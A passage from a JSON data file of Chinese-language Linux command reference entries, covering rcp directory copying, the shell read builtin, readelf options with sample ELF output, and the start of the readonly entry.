remote_dir，则 remote_dir 将需要一个相对路径（自主目录开始）或绝对路径（自 / 开始）。\n\n **要将名为 work 的子目录完整地复制到 webserver1远程计算机中的主目录下名为 products 的目录，请键入以下内容：** \n\n```\nrcp -r work webserver1:/home/root/products Enter\n```\n\n此命令在`webserver1:/home/root/products`下创建名为 work 的目录及其全部内容（假定`/home/root/products`已存在于 webserver1中）。\n\n本示例假定用户处于包含 work 的本地目录下。否则，必须提供该目录的相对或绝对路径，如`/home/root/work`。\n\n **从远程系统复制目录：** \n\n要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用 rcp 和 -r（递归）选项。\n\n```\nrcp –r remote_hostname:remote_dir local_dir Enter\n```\n\n要将名为 work 的远程目录复制到当前目录，请键入以下内容：\n\n```\nrcp –r webserver1:/home/root/work .Enter\n```\n\n`.`表示当前目录。将在此目录下创建 work 目录。\n\n\n\n"},{"name":"read","categoryId":0,"data":"read\n\u003d\u003d\u003d\n\n从键盘读取变量值\n\n## 补充说明\n\n**read命令** 从键盘读取变量的值，通常用在shell脚本中与用户进行交互的场合。该命令可以一次读取多个变量的值，变量和输入的值都需要使用空格隔开。在read命令后面，如果没有指定变量名，读取的数据将被自动赋值给特定的变量REPLY\n\n### 语法  \n\n```\nread(选项)(参数)\n```\n\n### 选项  \n\n```\n-p：指定读取值时的提示符；\n-t：指定读取值时等待的时间（秒）。\n```\n\n### 参数  \n\n变量：指定读取值的变量名。\n\n### 实例  \n\n下面的列表给出了read命令的常用方式：\n\n```\nread 1987name\n从标准输入读取输入并赋值给变量1987name。\n```\n\n```\nread first last\n从标准输入读取输入到第一个空格或者回车，将输入的第一个单词放到变量first中，并将该行其他的输入放在变量last中。\n```\n\n```\nread\n从标准输入读取一行并赋值给特定变量REPLY。\n```\n\n```\nread -a arrayname\n把单词清单读入arrayname的数组里。\n```\n\n```\nread -p \"text\"\n打印提示（text），等待输入，并将输入存储在REPLY中。\n```\n\n```\nread -r line\n允许输入包含反斜杠。\n```\n\n```\nread -t 3\n指定读取等待时间为3秒。\n```\n\n```\nread -n 2 var\n从输入中读取两个字符并存入变量var，不需要按回车读取。\n```\n\n```\nread -d \":\" var\n用定界符“:”结束输入行。\n```\n\n## read命令示例  \n\n从标准输入读取输入并赋值给变量1987name。\n\n```\n#read 1987name        #等待读取输入，直到回车后表示输入完毕，并将输入赋值给变量answer\nHelloWorld            #控制台输入Hello\n\n#echo $1987name       #打印变量\nHelloWorld\n```\n\n等待一组输入，每个单词之间使用空格隔开，直到回车结束，并分别将单词依次赋值给这三个读入变量。\n\n```\n#read one two three\n1 2 3                   #在控制台输入1 2 3，它们之间用空格隔开。\n\n#echo \"one \u003d $one, two \u003d $two, three \u003d $three\"\none \u003d 1, two \u003d 2, three \u003d 3\n```\n\nREPLY示例\n\n```\n#read                  #等待控制台输入，并将结果赋值给特定内置变量REPLY。\nThis is REPLY          #在控制台输入该行。 \n\n#echo $REPLY           #打印输出特定内置变量REPLY，以确认是否被正确赋值。\n\nThis is REPLY\n```\n\n-p选项示例\n\n```\n#read -p \"Enter your name: \"            #输出文本提示，同时等待输入，并将结果赋值给REPLY。\nEnter you name: stephen                 #在提示文本之后输入stephen\n\n#echo $REPLY\nstephen\n```\n\n等待控制台输入，并将输入信息视为数组，赋值给数组变量friends，输入信息用空格隔开数组的每个元素。\n\n```\n#read -a friends\nTim Tom Helen\n\n#echo \"They are ${friends[0]}, ${friends[1]} and ${friends[2]}.\"\nThey are Tim, Tom and Helen.\n```\n\n **补充一个终端输入密码时候，不让密码显示出来的例子。** \n\n方法1：\n\n```\n#!/bin/bash\nread -p \"输入密码：\" -s pwd\necho\necho password read, is \"$pwd\"\n```\n\n方法2：\n\n```\n#!/bin/bash\nstty -echo\nread -p \"输入密码：\" pwd\nstty echo\necho\necho 输入完毕。\n```\n\n其中，选项`-echo`禁止将输出发送到终端，而选项`echo`则允许发送输出。\n\n使用read命令从键盘读取变量值，并且将值赋给指定的变量，输入如下命令：\n\n```\nread v1 v3          #读取变量值\n```\n\n执行上面的指令以后，要求键入两个数据，如下所示：\n\n```\nLinux c+            #输入数据\n```\n\n完成之后，可以使用echo命令将指定的变量值输出查看，输入如下命令：\n\n```\necho $v1 $v3       #输出变量的值\n```\n\n执行输出变量值的命令以后，将显示用户所输入的数据值，如下所示：\n\n```\nLinux c+           #输出变量值\n```\n\n注意：使用echo命令输出变量值时，必须在变量名前添加符号`$`。否则，echo将直接输出变量名。\n\n\n"},{"name":"readelf","categoryId":0,"data":"readelf\n\u003d\u003d\u003d\n\n用于显示elf格式文件的信息\n\n## 补充说明\n\n**readelf命令** 用来显示一个或者多个elf格式的目标文件的信息，可以通过它的选项来控制显示哪些信息。这里的elf-file(s)就表示那些被检查的文件。可以支持32位，64位的elf格式文件，也支持包含elf文件的文档（这里一般指的是使用ar命令将一些elf文件打包之后生成的例如lib*.a之类的“静态库”文件）。 \n\n这个程序和objdump提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件)，所以即使BFD库有什么bug存在的话也不会影响到readelf程序。 \n\n运行readelf的时候，除了-v和-H之外，其它的选项必须有一个被指定。 \n\n### ELF文件类型  \n\n **种类型的ELF文件：** \n\n1.  可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如lib*.a文件。 \n2.  可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件a.out。 \n3.  共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成elf目标文件或者和执行文件一起创建进程映像，例如lib*.so文件。 \n\n **ELF文件作用：** \n\nELF文件参与程序的连接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待elf格式的文件： \n\n1.  如果用于编译和链接（可重定位文件），则编译器和链接器将把elf文件看作是节头表描述的节的集合,程序头表可选。 \n2.  如果用于加载执行（可执行文件），则加载器则将把elf文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。 \n3.  如果是共享文件，则两者都含有。 \n\n **ELF文件总体组成：**  \n\nelf文件头描述elf文件的总体信息。包括：系统相关，类型相关，加载相关，链接相关。 \n\n*   系统相关表示：elf文件标识的魔术数，以及硬件和平台等相关信息，增加了elf文件的移植性,使交叉编译成为可能。 \n*   类型相关就是前面说的那个类型。 \n*   加载相关：包括程序头表相关信息。 \n*   链接相关：节头表相关信息。 \n\n### 选项  \n\n```\n-a \n--all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I. \n\n-h \n--file-header 显示elf文件开始的文件头信息. \n\n-l \n--program-headers  \n--segments 显示程序头（段头）信息(如果有的话)。 \n\n-S \n--section-headers  \n--sections 显示节头信息(如果有的话)。 \n\n-g \n--section-groups 显示节组信息(如果有的话)。 \n\n-t \n--section-details 显示节的详细信息(-S的)。 \n\n-s \n--syms        \n--symbols 显示符号表段中的项（如果有的话）。 \n\n-e \n--headers 显示全部头信息，等价于: -h -l -S \n\n-n \n--notes 显示note段（内核注释）的信息。 \n\n-r \n--relocs 显示可重定位段的信息。 \n\n-u \n--unwind 显示unwind段信息。当前只支持IA64 ELF的unwind段信息。 \n\n-d \n--dynamic 显示动态段的信息。 \n\n-V \n--version-info 显示版本段的信息。 \n\n-A \n--arch-specific 显示CPU构架信息。 \n\n-D \n--use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 \n\n-x \u003cnumber or name\u003e \n--hex-dump\u003d\u003cnumber or name\u003e 以16进制方式显示指定段内内容。number指定段表中段的索引,或字符串指定文件中的段名。 \n\n-w[liaprmfFsoR] or \n--debug-dump[\u003dline,\u003dinfo,\u003dabbrev,\u003dpubnames,\u003daranges,\u003dmacro,\u003dframes,\u003dframes-interp,\u003dstr,\u003dloc,\u003dRanges] 显示调试段中指定的内容。 \n\n-I \n--histogram 显示符号的时候，显示bucket list长度的柱状图。 \n\n-v \n--version 显示readelf的版本信息。 \n\n-H \n--help 显示readelf所支持的命令行选项。 \n\n-W \n--wide 宽行输出。 \n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。 \n```\n\n### 实例  \n\n先给出如下例子：\n\n **1.对于可执行文件形式的elf格式文件：** \n\n1)查看可执行程序的源代码如下： \n\n```\nroot@localhost [test]$ cat main.cpp \n#include \u003ciostream\u003e \nusing std::cout; \nusing std::endl; \nvoid my_print(); \n\nint main(int argc, char *argv[]) \n{ \n        my_print(); \n        cout\u003c\u003c\"hello!\"\u003c\u003cendl; \n        return 0; \n} \n\nvoid  my_print() \n{ \n        cout\u003c\u003c\"print!\"\u003c\u003cendl; \n} \n```\n\n2)编译如下： \n\n```\n[root@localhost test]$ g++ main.cpp -o main \n[root@localhost test]$ g++ -g main.cpp -o main.debug \n```\n\n3)编译之后，查看生成的文件： \n\n```\n[root@localhost test]$ ls -l \n总计 64 \n-rwxr-xr-x 1 quietheart quietheart  6700 07-07 18:04 main \n-rw-r--r-- 1 quietheart quietheart   201 07-07 18:02 main.cpp \n-rwxr-xr-x 1 quietheart quietheart 38932 07-07 18:04 main.debug \n```\n\n这里，main.debug是带有调试信息的可执行文件，main是一般的可执行文件。 \n\n **2.对于库文件形式的elf格式文件：** \n\n1)查看库的源代码如下： \n\n```\n//myfile.h \n#ifndef __MYFILE_H \n#define __MYFILE_H \nvoid printInfo(); \n#endif \n\n//myfile.cpp \n#include \"myfile.h\" \n#include \u003ciostream\u003e \nusing std::cout; \nusing std::endl; \nvoid printInfo() \n{ \n    cout\u003c\u003c\"hello\"\u003c\u003cendl; \n} \n```\n\n2)编译如下： \n\n```\n[root@localhost test]$ g++ -c myfile.cpp \n[root@localhost test]$ g++ -shared -fPCI -o libmy.so myfile.o \n[root@localhost test]$ ar -r libmy.a myfile.o \nar: creating libmy.a \n```\n\n3)编译之后，查看生成的文件： \n\n[root@localhost test]$ ls -l \n\n总计 44 \n\n```\n-rw-r--r-- 1 quietheart quietheart 2154 07-08 16:14 libmy.a \n-rwxr-xr-x 1 quietheart quietheart 5707 07-08 16:08 libmy.so \n-rwxr-xr-x 1 quietheart quietheart  117 07-08 16:06 myfile.cpp \n-rwxr-xr-x 1 quietheart quietheart   63 07-08 16:08 myfile.h \n-rw-r--r-- 1 quietheart quietheart 2004 07-08 16:08 myfile.o \nlibmy.a  libmy.so  myfile.cpp  myfile.h  myfile.o \n```\n\n这里，分别生成目标文件myfile.o，共享库文件libmy.so，和静态库文件libmy.a。 \n\n基于以上可执行文件和库，这里给出一些常用的命令。 \n\n **读取可执行文件形式的elf文件头信息：** \n\n```\n[root@localhost test]$ readelf -h main \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2\u0027s complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  type:                              exec (Executable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x8048580 \n  Start of program headers:          52 (bytes into file) \n  Start of section headers:          3232 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           32 (bytes) \n  Number of program headers:         8 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         29 \n  Section header string table index: 26 \n```\n\n这里，可见可执行文件的elf文件，其类型为EXEC(可执行文件)。另外，含调试信息的\"main.debug\"和不含调试信息的\"main\"除了一些大小信息之外，其内容是一样的。并且由此可见文件的体系结构为Intel 80386。 \n\n **读取目标文件形式的elf文件头信息：** \n\n```\n[root@localhost test]$ readelf -h myfile.o \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2\u0027s complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              REL (Relocatable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x0 \n  Start of program headers:          0 (bytes into file) \n  Start of section headers:          516 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           0 (bytes) \n  Number of program headers:         0 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         15 \n  Section header string table index: 12 \n```\n\n这里，可见目标文件的elf文件，其类型为REL(可重定位文件)。 \n\n **读取静态库文件形式的elf文件头信息：** \n\n```\n[root@localhost test]$ readelf -h libmy.a \nFile: libmy.a(myfile.o) \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2\u0027s complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              REL (Relocatable file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x0 \n  Start of program headers:          0 (bytes into file) \n  Start of section headers:          516 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           0 (bytes) \n  Number of program headers:         0 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         15 \n  Section header string table index: 12 \n```\n\n这里，可见静态库文件的elf文件，其类型为REL(可重定位文件)。 \n\n **读取动态库文件形式的elf文件头信息：** \n\n```\n[root@localhost test]$ readelf -h libmy.so \nELF Header: \n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF32 \n  Data:                              2\u0027s complement, little endian \n  Version:                           1 (current) \n  OS/ABI:                            UNIX - System V \n  ABI Version:                       0 \n  Type:                              DYN (Shared object file) \n  Machine:                           Intel 80386 \n  Version:                           0x1 \n  Entry point address:               0x550 \n  Start of program headers:          52 (bytes into file) \n  Start of section headers:          2768 (bytes into file) \n  Flags:                             0x0 \n  Size of this header:               52 (bytes) \n  Size of program headers:           32 (bytes) \n  Number of program headers:         5 \n  Size of section headers:           40 (bytes) \n  Number of section headers:         27 \n  Section header string table index: 24 \n```\n\n这里，可见动态库文件的elf文件，其类型为DYN(共享目标文件)。 \n\n **查看可执行的elf文件程序头表信息：** \n\n```\n[root@localhost test]$ readelf -l main \nElf file type is EXEC (Executable file) \nEntry point 0x8048580 \nThere are 8 program headers, starting at offset 52 \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4 \n  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1 \n      Requesting program interpreter: /lib/[ld-linux.so.2] \n  LOAD           0x000000 0x08048000 0x08048000 0x00970 0x00970 R E 0x1000 \n  LOAD           0x000970 0x08049970 0x08049970 0x00130 0x001c8 RW  0x1000 \n  DYNAMIC        0x000988 0x08049988 0x08049988 0x000e0 0x000e0 RW  0x4 \n  NOTE           0x000148 0x08048148 0x08048148 0x00020 0x00020 R   0x4 \n  GNU_EH_FRAME   0x000820 0x08048820 0x08048820 0x00044 0x00044 R   0x4 \n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   00     \n   01     .interp \n   02     .interp .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss \n   04     .dynamic \n   05     .note.ABI-tag \n   06     .eh_frame_hdr \n   07     \n```\n\n这里，含调试信息的\"main.debug\"和不含调试信息的\"main\"其内容是一样的。 \n\n **查看目标文件的elf文件程序头表信息： ** \n\n```\n[root@localhost test]$ readelf -l myfile.o \nThere are no program headers in this file. \n```\n\n这里可知，可重定位的目标文件，它没程序头表。 \n\n **查看静态库文件的elf文件程序头表信息：** \n\n```\n[root@localhost test]$ readelf -l libmy.a \nFile: libmy.a(myfile.o) \nThere are no program headers in this file. \n```\n\n这里可知，可重定位的静态库文件，它没程序头表。 \n\n **查看动态库文件的elf文件程序头表信息：** \n\n```\n[root@localhost test]$ readelf -l libmy.so \nElf file type is DYN (Shared object file) \nEntry point 0x550 \nThere are 5 program headers, starting at offset 52 \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  LOAD           0x000000 0x00000000 0x00000000 0x007f4 0x007f4 R E 0x1000 \n  LOAD           0x0007f4 0x000017f4 0x000017f4 0x0011c 0x00128 RW  0x1000 \n  DYNAMIC        0x000810 0x00001810 0x00001810 0x000e0 0x000e0 RW  0x4 \n  GNU_EH_FRAME   0x000738 0x00000738 0x00000738 0x0002c 0x0002c R   0x4 \n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   00     .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   01     .ctors .dtors .jcr .data.rel.ro .dynamic .got .got.plt .bss \n   02     .dynamic \n   03     .eh_frame_hdr \n   04     \n```\n\n这里可知，做为共享目标文件的动态库，它程序头表。 \n\n **查看一个可执行的elf文件的节信息：** \n\n```\n[root@localhost test]$ readelf -S main \nThere are 29 section headers, starting at offset 0xca0: \nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1 \n  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4 \n  [ 3] .gnu.hash         GNU_HASH        08048168 000168 000030 04   A  4   0  4 \n  [ 4] .dynsym           DYNSYM          08048198 000198 0000d0 10   A  5   1  4 \n  [ 5] .dynstr           STRTAB          08048268 000268 000183 00   A  0   0  1 \n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a 02   A  4   0  2 \n  [ 7] .gnu.version_r    VERNEED         08048408 000408 000060 00   A  5   2  4 \n  [ 8] .rel.dyn          REL             08048468 000468 000010 08   A  4   0  4 \n  [ 9] .rel.plt          REL             08048478 000478 000048 08   A  4  11  4 \n  [10] .init             PROGBITS        080484c0 0004c0 000017 00  AX  0   0  4 \n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0 04  AX  0   0  4 \n  [12] .text             PROGBITS        08048580 000580 000268 00  AX  0   0 16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c 00  AX  0   0  4 \n  [14] .rodata           PROGBITS        08048804 000804 00001a 00   A  0   0  4 \n  [15] .eh_frame_hdr     PROGBITS        08048820 000820 000044 00   A  0   0  4 \n  [16] .eh_frame         PROGBITS        08048864 000864 00010c 00   A  0   0  4 \n  [17] .ctors            PROGBITS        08049970 000970 00000c 00  WA  0   0  4 \n  [18] .dtors            PROGBITS        0804997c 00097c 000008 00  WA  0   0  4 \n  [19] .jcr              PROGBITS        08049984 000984 000004 00  WA  0   0  4 \n  [20] .dynamic          DYNAMIC         08049988 000988 0000e0 08  WA  5   0  4 \n  [21] .got              PROGBITS        08049a68 000a68 000004 04  WA  0   0  4 \n  [22] .got.plt          PROGBITS        08049a6c 000a6c 000030 04  WA  0   0  4 \n  [23] .data             PROGBITS        08049a9c 000a9c 000004 00  WA  0   0  4 \n  [24] .bss              NOBITS          08049aa0 000aa0 000098 00  WA  0   0  8 \n  [25] .comment          PROGBITS        00000000 000aa0 000114 00      0   0  1 \n  [26] .shstrtab         STRTAB          00000000 000bb4 0000e9 00      0   0  1 \n  [27] .symtab           SYMTAB          00000000 001128 000510 10     28  53  4 \n  [28] .strtab           STRTAB          00000000 001638 0003f4 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n这里，main是可执行文件，不含调试信息。 \n\n **查看一个包含调试信息的可执行的elf文件的节信息：** \n\n```\n[root@localhost test]$ readelf -S main.debug \nThere are 37 section headers, starting at offset 0x88c8: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1 \n  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4 \n  [ 3] .gnu.hash         GNU_HASH        08048168 000168 000030 04   A  4   0  4 \n  [ 4] .dynsym           DYNSYM          08048198 000198 0000d0 10   A  5   1  4 \n  [ 5] .dynstr           STRTAB          08048268 000268 000183 00   A  0   0  1 \n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a 02   A  4   0  2 \n  [ 7] .gnu.version_r    VERNEED         08048408 000408 000060 00   A  5   2  4 \n  [ 8] .rel.dyn          REL             08048468 000468 000010 08   A  4   0  4 \n  [ 9] .rel.plt          REL             08048478 000478 000048 08   A  4  11  4 \n  [10] .init             PROGBITS        080484c0 0004c0 000017 00  AX  0   0  4 \n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0 04  AX  0   0  4 \n  [12] .text             PROGBITS        08048580 000580 000268 00  AX  0   0 16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c 00  AX  0   0  4 \n  [14] .rodata           PROGBITS        08048804 000804 00001a 00   A  0   0  4 \n  [15] .eh_frame_hdr     PROGBITS        08048820 000820 000044 00   A  0   0  4 \n  [16] .eh_frame         PROGBITS        08048864 000864 00010c 00   A  0   0  4 \n  [17] .ctors            PROGBITS        08049970 000970 00000c 00  WA  0   0  4 \n  [18] .dtors            PROGBITS        0804997c 00097c 000008 00  WA  0   0  4 \n  [19] .jcr              PROGBITS        08049984 000984 000004 00  WA  0   0  4 \n  [20] .dynamic          DYNAMIC         08049988 000988 0000e0 08  WA  5   0  4 \n  [21] .got              PROGBITS        08049a68 000a68 000004 04  WA  0   0  4 \n  [22] .got.plt          PROGBITS        08049a6c 000a6c 000030 04  WA  0   0  4 \n  [23] .data             PROGBITS        08049a9c 000a9c 000004 00  WA  0   0  4 \n  [24] .bss              NOBITS          08049aa0 000aa0 000098 00  WA  0   0  8 \n  [25] .comment          PROGBITS        00000000 000aa0 000114 00      0   0  1 \n  [26] .debug_aranges    PROGBITS        00000000 000bb4 000020 00      0   0  1 \n  [27] .debug_pubnames   PROGBITS        00000000 000bd4 000028 00      0   0  1 \n  [28] .debug_info       PROGBITS        00000000 000bfc 0067aa 00      0   0  1 \n  [29] .debug_abbrev     PROGBITS        00000000 0073a6 000726 00      0   0  1 \n  [30] .debug_line       PROGBITS        00000000 007acc 0003e1 00      0   0  1 \n  [31] .debug_frame      PROGBITS        00000000 007eb0 00009c 00      0   0  4 \n  [32] .debug_str        PROGBITS        00000000 007f4c 000735 00      0   0  1 \n  [33] .debug_loc        PROGBITS        00000000 008681 0000f3 00      0   0  1 \n  [34] .shstrtab         STRTAB          00000000 008774 000151 00      0   0  1 \n  [35] .symtab           SYMTAB          00000000 008e90 000590 10     36  61  4 \n  [36] .strtab           STRTAB          00000000 009420 0003f4 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n可见，相对非调试版本的可执行文件，多了\".debug*\"段的信息。 \n\n **查看一个目标文件的elf文件的节信息：** \n\n```\n[root@localhost test]$ readelf -S myfile.o \nThere are 15 section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .text             PROGBITS        00000000 000034 00009e 00  AX  0   0  4 \n  [ 2] .rel.text         REL             00000000 000744 000060 08     13   1  4 \n  [ 3] .data             PROGBITS        00000000 0000d4 000000 00  WA  0   0  4 \n  [ 4] .bss              NOBITS          00000000 0000d4 000001 00  WA  0   0  4 \n  [ 5] .ctors            PROGBITS        00000000 0000d4 000004 00  WA  0   0  4 \n  [ 6] .rel.ctors        REL             00000000 0007a4 000008 08     13   5  4 \n  [ 7] .rodata           PROGBITS        00000000 0000d8 000006 00   A  0   0  1 \n  [ 8] .eh_frame         PROGBITS        00000000 0000e0 00008c 00   A  0   0  4 \n  [ 9] .rel.eh_frame     REL             00000000 0007ac 000028 08     13   8  4 \n  [10] .comment          PROGBITS        00000000 00016c 00002e 00      0   0  1 \n  [11] .note.GNU-stack   PROGBITS        00000000 00019a 000000 00      0   0  1 \n  [12] .shstrtab         STRTAB          00000000 00019a 00006a 00      0   0  1 \n  [13] .symtab           SYMTAB          00000000 00045c 000180 10     14  14  4 \n  [14] .strtab           STRTAB          00000000 0005dc 000166 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n\n\n```\n\n **查看一个静态库文件的elf文件的节信息：** \n\n```\n[root@localhost test]$ readelf -S libmy.a \nFile: libmy.a(myfile.o) \nThere are 15 section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .text             PROGBITS        00000000 000034 00009e 00  AX  0   0  4 \n  [ 2] .rel.text         REL             00000000 000744 000060 08     13   1  4 \n  [ 3] .data             PROGBITS        00000000 0000d4 000000 00  WA  0   0  4 \n  [ 4] .bss              NOBITS          00000000 0000d4 000001 00  WA  0   0  4 \n  [ 5] .ctors            PROGBITS        00000000 0000d4 000004 00  WA  0   0  4 \n  [ 6] .rel.ctors        REL             00000000 0007a4 000008 08     13   5  4 \n  [ 7] .rodata           PROGBITS        00000000 0000d8 000006 00   A  0   0  1 \n  [ 8] .eh_frame         PROGBITS        00000000 0000e0 00008c 00   A  0   0  4 \n  [ 9] .rel.eh_frame     REL             00000000 0007ac 000028 08     13   8  4 \n  [10] .comment          PROGBITS        00000000 00016c 00002e 00      0   0  1 \n  [11] .note.GNU-stack   PROGBITS        00000000 00019a 000000 00      0   0  1 \n  [12] .shstrtab         STRTAB          00000000 00019a 00006a 00      0   0  1 \n  [13] .symtab           SYMTAB          00000000 00045c 000180 10     14  14  4 \n  [14] .strtab           STRTAB          00000000 0005dc 000166 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n **查看一个动态库文件的elf文件的节信息：** \n\n```\n[root@localhost test]$ readelf -S libmy.so \nThere are 27 section headers, starting at offset 0xad0: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0 \n  [ 1] .gnu.hash         GNU_HASH        000000d4 0000d4 00003c 04   A  2   0  4 \n  [ 2] .dynsym           DYNSYM          00000110 000110 000120 10   A  3   1  4 \n  [ 3] .dynstr           STRTAB          00000230 000230 000199 00   A  0   0  1 \n  [ 4] .gnu.version      VERSYM          000003ca 0003ca 000024 02   A  2   0  2 \n  [ 5] .gnu.version_r    VERNEED         000003f0 0003f0 000050 00   A  3   2  4 \n  [ 6] .rel.dyn          REL             00000440 000440 0000b0 08   A  2   0  4 \n  [ 7] .rel.plt          REL             000004f0 0004f0 000010 08   A  2   9  4 \n  [ 8] .init             PROGBITS        00000500 000500 000017 00  AX  0   0  4 \n  [ 9] .plt              PROGBITS        00000518 000518 000030 04  AX  0   0  4 \n  [10] .text             PROGBITS        00000550 000550 0001c4 00  AX  0   0 16 \n  [11] .fini             PROGBITS        00000714 000714 00001c 00  AX  0   0  4 \n  [12] .rodata           PROGBITS        00000730 000730 000006 00   A  0   0  1 \n  [13] .eh_frame_hdr     PROGBITS        00000738 000738 00002c 00   A  0   0  4 \n  [14] .eh_frame         PROGBITS        00000764 000764 000090 00   A  0   0  4 \n  [15] .ctors            PROGBITS        000017f4 0007f4 00000c 00  WA  0   0  4 \n  [16] .dtors            PROGBITS        00001800 000800 000008 00  WA  0   0  4 \n  [17] .jcr              PROGBITS        00001808 000808 000004 00  WA  0   0  4 \n  [18] .data.rel.ro      PROGBITS        0000180c 00080c 000004 00  WA  0   0  4 \n  [19] .dynamic          DYNAMIC         00001810 000810 0000e0 08  WA  3   0  4 \n  [20] .got              PROGBITS        000018f0 0008f0 00000c 04  WA  0   0  4 \n  [21] .got.plt          PROGBITS        000018fc 0008fc 000014 04  WA  0   0  4 \n  [22] .bss              NOBITS          00001910 000910 00000c 00  WA  0   0  4 \n  [23] .comment          PROGBITS        00000000 000910 0000e6 00      0   0  1 \n  [24] .shstrtab         STRTAB          00000000 0009f6 0000da 00      0   0  1 \n  [25] .symtab           SYMTAB          00000000 000f08 000410 10     26  48  4 \n  [26] .strtab           STRTAB          00000000 001318 000333 00      0   0  1 \nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n```\n\n\n"},{"name":"readonly","categoryId":0,"data":"readonly\n\u003d\u003d\u003d\n\n定义只读shell变量或函数\n\n## 补充说明\n\n**readonly命令** 用于定义只读shell变量和shell函数。readonly命令的选项-p可以输出显示系统中所有定义的只读变量。\n\n### 语法  \n\n```\nreadonly(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：定义只读函数；\n-a：定义只读数组变量；\n-p：显示系统中全部只读变量列表。\n```\n\n### 参数  \n\n变量定义：定义变量，格式为“变量名\u003d‘变量值’”。\n\n### 实例  